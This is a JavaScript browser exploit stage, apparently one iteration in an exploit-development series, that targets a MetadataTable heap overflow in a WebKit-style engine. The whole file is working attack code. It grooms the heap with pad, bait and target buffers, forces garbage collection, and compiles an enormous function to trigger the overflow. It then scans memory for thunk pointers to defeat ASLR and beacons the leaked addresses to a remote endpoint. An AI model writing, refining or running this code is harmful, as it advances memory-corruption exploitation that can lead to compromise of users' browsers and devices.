// p154 - MetadataTable overflow ASLR leak with improved heap feng shui
//
// p153 problem: SPRAY-300, COMPILED-OK, bufs0-nz0
// The spray buffers and MetadataTable ended up in different 4MB pages.
// libpas marge bitfit preferred a fresh page over reusing freed holes.
//
// Fix: Sequential allocation strategy
// 1. Exhaust current free list with 200 "pad" buffers (same size)
// 2. Allocate 50 "bait" buffers (will free to create holes)
// 3. Allocate 150 "target" buffers (will scan for leaked data)
// 4. Free ALL bait buffers → creates holes between pad and target
// 5. Force GC → holes available for MetadataTable
// 6. Compile → MetadataTable fills a bait hole → writes FORWARD into targets
//
// Beacon prefix: V154-

(function() {
  function B(tag, body) {
    try {
      var url = '/beacon/V154-' + tag + '?t=' + Date.now();
      if (body !== undefined && body !== null && body !== '') {
        navigator.sendBeacon(url, String(body).substring(0, 900));
      } else {
        navigator.sendBeacon(url);
      }
    } catch (e) {}
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function readHex8(view, off) {
    var hex = '';
    for (var h = 7; h >= 0; h--) hex += hexByte(view[off + h]);
    return hex;
  }
  function readU32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }
  function anyNonZero(view, off, len) {
    for (var b = 0; b < len; b++) { if (view[off + b] !== 0) return true; }
    return false;
  }

  B('BOOT');

  var BUF_SZ = 100112;

  // Phase 1: Pad allocations to exhaust free list
  // These push the allocator to extend into fresh pages
  var pads = [];
  for (var i = 0; i < 200; i++) {
    pads.push(new ArrayBuffer(BUF_SZ));
  }
  B('PAD-200');

  // Phase 2: Bait allocations (will be freed to create holes)
  var baits = [];
  for (var i = 0; i < 50; i++) {
    baits.push(new ArrayBuffer(BUF_SZ));
  }
  B('BAIT-50');

  // Phase 3: Target allocations (will scan for leaked data)
  // These are allocated AFTER baits, so at higher addresses
  var targets = [];
  var tviews = [];
  for (var i = 0; i < 150; i++) {
    var ab = new ArrayBuffer(BUF_SZ);
    targets.push(ab);
    tviews.push(new Uint8Array(ab));
  }
  B('TARGET-150');

  // Phase 4: Free ALL baits to create holes
  for (var i = 0; i < 50; i++) {
    baits[i] = null;
  }
  baits = null;
  B('BAIT-FREED');

  // Phase 5: Force GC to reclaim bait backing stores
  for (var g = 0; g < 10; g++) {
    var garbage = new Array(50000);
    for (var j = 0; j < 50000; j++) garbage[j] = new ArrayBuffer(256);
    garbage = null;
  }
  B('GC-DONE');

  // Phase 6: Compile the 38M function
  // MetadataTable (100112 bytes) should fill a freed bait hole
  // Forward write goes into target buffers at higher addresses
  var N = 38348816;
  B('BUILD-N' + N);

  var CHUNK = 4000000;
  var chunksN = Math.floor(N / CHUNK);
  var rem = N - chunksN * CHUNK;

  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__p154fn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__p154ok=1;';
  callChunk = null;

  var blob = new Blob(parts, { type: 'application/javascript' });
  var blobMB = Math.round(blob.size / 1048576);
  B('BLOB-' + blobMB + 'MB');
  parts = null;

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { B('SCRIPT-ERR'); };
  sc.onload = function() {
    var ok = window.__p154ok ? 'OK' : 'FAIL';
    B('COMPILED-' + ok);
    if (ok === 'OK') setTimeout(phaseScan, 100);
    else B('DONE');
  };
  document.head.appendChild(sc);
  sc.src = url;

  // Phase 7: Scan target buffers
  function phaseScan() {
    B('SCAN-START');

    var hitBufs = 0;
    var totalNZ = 0;
    var leakedPtrs = [];

    for (var i = 0; i < tviews.length; i++) {
      var view = tviews[i];
      if (!view) continue;

      // Quick scan: check a few spots per buffer first
      var hasData = false;
      for (var spot = 0; spot < view.length; spot += 1024) {
        if (view[spot] !== 0) { hasData = true; break; }
      }
      if (!hasData) {
        // Check at known entry offsets
        for (var e = 12; e < view.length; e += 112) {
          if (view[e] !== 0) { hasData = true; break; }
        }
      }
      if (!hasData) continue;

      // Full scan
      var nz = 0;
      var firstOff = -1;
      for (var j = 0; j < view.length; j++) {
        if (view[j] !== 0) {
          if (firstOff === -1) firstOff = j;
          nz++;
        }
      }

      if (nz > 0) {
        hitBufs++;
        totalNZ += nz;
        B('HIT-' + i + '-nz' + nz + '-f' + firstOff);

        // Find entry alignment by brute force
        var bestBase = -1, bestHits = 0;
        for (var tryBase = 0; tryBase < 112; tryBase++) {
          var hits = 0;
          for (var tryOff = tryBase + 12; tryOff + 4 <= view.length; tryOff += 112) {
            if (anyNonZero(view, tryOff, 4)) hits++;
          }
          if (hits > bestHits) { bestHits = hits; bestBase = tryBase; }
        }
        B('EBASE-' + i + '-b' + bestBase + '-h' + bestHits);

        var entryBase = bestBase >= 0 ? bestBase : firstOff;

        // Scan for thunk pointer at entry+24 (m_slowPathCallDestination)
        var ptrsDumped = 0;
        for (var entryOff = entryBase; entryOff + 32 <= view.length && ptrsDumped < 8; entryOff += 112) {
          var ptrOff = entryOff + 24;
          if (ptrOff + 8 > view.length) break;
          if (!anyNonZero(view, ptrOff, 8)) continue;

          var hex = readHex8(view, ptrOff);
          B('THUNK-' + ptrsDumped + '-O' + ptrOff + '=' + hex);
          ptrsDumped++;
          if (leakedPtrs.length < 5) leakedPtrs.push(hex);
        }

        // Raw dump first 512 bytes of first hit
        if (hitBufs <= 2) {
          var chunks = '';
          var cc = 0;
          for (var off = 0; off + 8 <= 512 && off + 8 <= view.length; off += 8) {
            if (anyNonZero(view, off, 8) && cc < 16) {
              chunks += off + ':' + readHex8(view, off) + ' ';
              cc++;
            }
          }
          if (cc > 0) B('RAW-' + i, chunks.trim());
        }
      }
    }

    B('RESULT-bufs' + hitBufs + '-nz' + totalNZ);

    if (hitBufs > 0 && leakedPtrs.length > 0) {
      B('ASLR-LEAK');
      for (var p = 0; p < leakedPtrs.length; p++) {
        B('PTR' + p + '=' + leakedPtrs[p]);
      }
    } else {
      B('NO-LEAK');
    }

    // Also check pad buffers (lower addresses) as diagnostic
    var padHits = 0;
    for (var pi = 0; pi < pads.length; pi++) {
      if (!pads[pi]) continue;
      var pv = new Uint8Array(pads[pi]);
      for (var ps = 0; ps < pv.length; ps += 2048) {
        if (pv[ps] !== 0) { padHits++; break; }
      }
    }
    B('PAD-HITS-' + padHits);

    B('DONE');
  }
})();
